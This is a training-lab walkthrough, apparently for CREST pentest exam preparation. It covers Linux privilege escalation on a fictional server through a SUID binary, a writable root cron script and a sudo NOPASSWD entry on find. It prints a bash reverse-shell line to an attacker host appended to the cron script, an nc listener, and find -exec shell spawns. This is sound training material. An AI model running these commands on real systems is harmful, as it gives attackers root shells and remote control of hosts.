Linux Privilege Escalation - SUID, Cron and Sudo

Escalate from a low-privilege shell on SYNTEX-LNX01 to root. Three distinct escalation paths are available: a SUID binary, a world-writable cron job, and a sudo NOPASSWD misconfiguration. Work through each path and understand what makes them exploitable.

Scenario

You have obtained valid SSH credentials for the Syntex Solutions Linux server: jsmith / Password1. jsmith is a standard user with no special privileges. Your objective is to identify misconfigured permissions and escalate to root. Document each vector as you find it - in a real engagement, finding multiple escalation paths demonstrates depth of vulnerability and increases severity.

Learning Objectives
  • Gain initial access as a low-privilege user via SSH
  • Enumerate the system for privilege escalation vectors
  • Exploit a SUID binary using GTFOBins technique
  • Exploit a world-writable cron job running as root
  • Exploit a sudo NOPASSWD misconfiguration
  • Document findings in a format suitable for a penetration test report

Phase 2 - Privilege Escalation Enumeration
2
SUID Binary Discovery

SUID (Set User ID) binaries run with the permissions of the file owner rather than the current user. When a binary owned by root has the SUID bit set, executing it gives temporary root-level access. We look for non-standard SUID binaries - anything not in the default list for this distribution is worth investigating.

# Find all SUID binaries on the system
find / -perm -u=s -type f 2>/dev/null

# More readable output
find / -perm -4000 -type f 2>/dev/null | sort

You should see the standard system SUID binaries (su, sudo, passwd, mount) AND a non-standard binary. The custom one is your target.

ℹ
GTFOBins: GTFOBins (gtfobins.github.io) is a curated list of Unix binaries that can be exploited to escalate privileges. When you find a SUID binary, search GTFOBins for the binary name and look for the "SUID" section.
SUID binary discovery
3
Cron Job Enumeration

Cron jobs run scheduled tasks as specified users. A script running as root that any user can modify is a critical vulnerability.

# Check the system-wide crontab
cat /etc/crontab

# Check cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# Look at the Syntex maintenance script
ls -la /opt/syntex/scripts/
cat /opt/syntex/scripts/maintenance.sh
⚠
Critical check: Note the permissions on maintenance.sh. Who owns it? What permissions does it have? Can jsmith write to it?

6
Path B - World-Writable Cron Job

The maintenance.sh script runs as root every minute. Since jsmith can write to it, inject a reverse shell payload. This is one of the most impactful misconfiguration findings in Linux pentesting.

# Open a listener on Kali (in a SEPARATE terminal)
# Run this on your Kali machine:
nc -lvnp 4444

# Back on the LNX01 session as jsmith:
# Append a reverse shell to the cron script
echo 'bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1' >> /opt/syntex/scripts/maintenance.sh

# Verify the injection was added
tail -5 /opt/syntex/scripts/maintenance.sh

# Wait up to 60 seconds for the cron to fire
# Your Kali listener should receive a root shell
ℹ
Why this works: The cron daemon runs as root. It executes maintenance.sh as root. Because jsmith can write to that script, jsmith controls what root executes. The reverse shell inherits root's privileges when it connects back to Kali.
Path B result
7
Path C - Sudo NOPASSWD with GTFOBins

Switch to sysadmin. The sudo NOPASSWD entry allows sysadmin to run a specific binary as root without a password. If that binary appears on GTFOBins, it can be used to execute a shell.

# Switch to sysadmin
su - sysadmin
# Password: sysadmin123

# Use sudo find to escalate (GTFOBins - sudo section)
# find can execute commands with -exec; running as root via sudo
sudo find /etc/passwd -exec /bin/bash \;

# Alternatively:
sudo find / -name passwd -exec /bin/bash \;

# Confirm root
id
whoami
★
CREST Exam Point: Sudo NOPASSWD findings should reference the specific sudoers entry (show the exact line from /etc/sudoers or sudo -l), the GTFOBins technique used, and include a screenshot showing the id command returning root. The finding title is "Sudo NOPASSWD Misconfiguration Allows Root Escalation".

In a real engagement: Never exfiltrate the shadow file or real credentials from a client system. Document the hash format and the fact that you had access as proof. In this training lab, capturing the shadow file demonstrates full system compromise.

★
Lab Complete - Key Takeaways: Linux privilege escalation relies on three pillars: SUID binaries, writable cron jobs, and sudo misconfigurations. CREST examiners expect candidates to identify all three, not just one. When multiple escalation paths exist on a single host, this is evidence of systemic security weakness, not just a single misconfiguration - and that systemic risk warrants a higher overall severity in the report.
